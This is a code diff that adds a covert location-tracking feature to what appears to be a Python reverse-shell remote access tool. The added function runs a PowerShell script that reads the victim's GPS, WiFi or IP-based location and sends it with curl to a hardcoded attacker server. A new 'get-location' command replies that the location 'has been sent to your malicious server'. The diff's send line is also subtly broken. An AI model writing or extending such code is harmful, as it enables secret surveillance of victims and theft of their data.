@@ -5,7 +5,64 @@ import shlex
 import threading
 import sys
 import webbrowser
+import json
 SERVER_URL = "http://192.168.88.105:2020"
+def get_location_and_send():
+    ps_command = r'''
+    Add-Type -AssemblyName System.Device
+    $geo = New-Object System.Device.Location.GeoCoordinateWatcher([System.Device.Location.GeoPositionAccuracy]::High)
+    $geo.Start()
+    $i=0
+    while (($geo.Status -ne 'Ready') -and ($geo.Permission -ne 'Denied') -and ($i -lt 30)) {
+        Start-Sleep -Milliseconds 200
+        $i++
+    }
+    if ($geo.Permission -eq 'Denied' -or $geo.Status -ne 'Ready' -or $geo.Position.Location.HorizontalAccuracy -gt 500) {
+        try {
+            $ip = Invoke-RestMethod ipinfo.io
+            @{
+                source    = "IP"
+                city      = $ip.city
+                region    = $ip.region
+                country   = $ip.country
+                latitude  = $ip.loc.Split(',')[0]
+                longitude = $ip.loc.Split(',')[1]
+                accuracy  = "approximate"
+            } | ConvertTo-Json
+        } catch {
+            @{ error = "location_unavailable" } | ConvertTo-Json
+        }
+    } else {
+        $c = $geo.Position.Location
+        @{
+            source    = "GPS/WiFi"
+            latitude  = $c.Latitude
+            longitude = $c.Longitude
+            accuracy  = [math]::Round($c.HorizontalAccuracy,2)
+        } | ConvertTo-Json
+    }
+    '''
+    ps_result = subprocess.run(
+        ["powershell", "-NoProfile", "-Command", ps_command],
+        capture_output=True,
+        text=True
+    )
+    if not ps_result.stdout:
+        print("No location...")
+    location_json = ps_result.stdout.strip()
+    curl_cmd = [
+        "curl",
+        "-X", "POST",
+        SERVER_URL,
+        "-H", "Content-Type: application/json",
+        "-d", location_json
+    ]
+    subprocess.run(
+        curl_cmd,
+        capture_output=True,
+        text=True
+    )
+    return True
 def send_files(args):
     files_to_send = args[1:]
     if not files_to_send:
@@ -50,6 +107,9 @@ def connect_back():
             cmd = s.recv(1024).decode("utf-8").strip()
             if not cmd:
                 continue
+            if cmd == "get-location":
+                if get_location_and_send() == True:
+                    s.send(f"{"Location has been sent to your malicious server".encode("utf-8")}\n")
             if cmd.startswith("send"):
                 args_files = cmd.split()
                 send_files(args_files)
